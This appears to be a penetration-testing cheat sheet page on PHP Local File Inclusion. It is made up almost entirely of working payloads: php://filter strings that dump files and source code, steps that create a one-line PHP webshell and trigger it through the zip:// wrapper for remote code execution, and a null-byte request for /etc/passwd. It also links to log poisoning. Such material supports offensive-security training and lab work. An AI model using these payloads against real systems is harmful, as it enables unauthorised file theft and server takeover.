---
icon: file-import
description: Local File Inclusion
---

# LFI

{% hint style="info" %}
### <mark style="color:purple;">`PHP Filters & Wrappers`</mark>

#### <mark style="color:red;">`Filter Inclusion`</mark>

{% code title="Exfiltrate files" overflow="wrap" %}
```php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
```
{% endcode %}

{% code title="Exfiltrate the source code" %}
```php
php://filter/convert.base64-encode/resource=dashboard
```
{% endcode %}

#### <mark style="color:red;">`Remote Code Execution`</mark>

<mark style="color:purple;">The</mark> <mark style="color:orange;">**`zip://`**</mark> <mark style="color:purple;">stream wrapper can be used in specific attack scenarios to potentially execute malicious code.</mark>

* <mark style="color:purple;">First, create the</mark> <mark style="color:orange;">**`webshell`**</mark><mark style="color:purple;">:</mark>

```sh
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```

* <mark style="color:purple;">Second,</mark> <mark style="color:orange;">**`zip`**</mark> <mark style="color:purple;">the file:</mark>

```sh
zip shell.zip cmd.php
```

* <mark style="color:purple;">Important to mention that the file extension can be different from</mark> <mark style="color:orange;">**`.zip`**</mark><mark style="color:purple;">, the wrapper will still execute the code inside.</mark>
* <mark style="color:purple;">Third, upload the file and once is done, use the wrapper:</mark>

{% code overflow="wrap" %}
```php
zip://uploads/PATH/TO/FILE%23cmd&cmd=id
```
{% endcode %}

* <mark style="color:purple;">Have in mind that</mark> <mark style="color:orange;">**`%23`**</mark> <mark style="color:purple;">is the URL encoded version of</mark> <mark style="color:orange;">**`#`**</mark> <mark style="color:purple;">and is used to reference a file inside the</mark> <mark style="color:orange;">**`zip`**</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">The</mark> <mark style="color:orange;">`%00`</mark> <mark style="color:purple;">Null Terminator</mark>

<mark style="color:purple;">Is often used to</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**terminate a string prematurely,**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">effectively allowing attackers to manipulate the filename or file extension.</mark>

```url
http://10.10.10.80/index.php?op=/etc/passwd%00
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">`Chaining`</mark>

* <mark style="color:purple;">If it's possible to access logs try</mark> [<mark style="color:orange;">**`Log Poisoning`**</mark>](log-poisoning.md)&#x20;
{% endhint %}

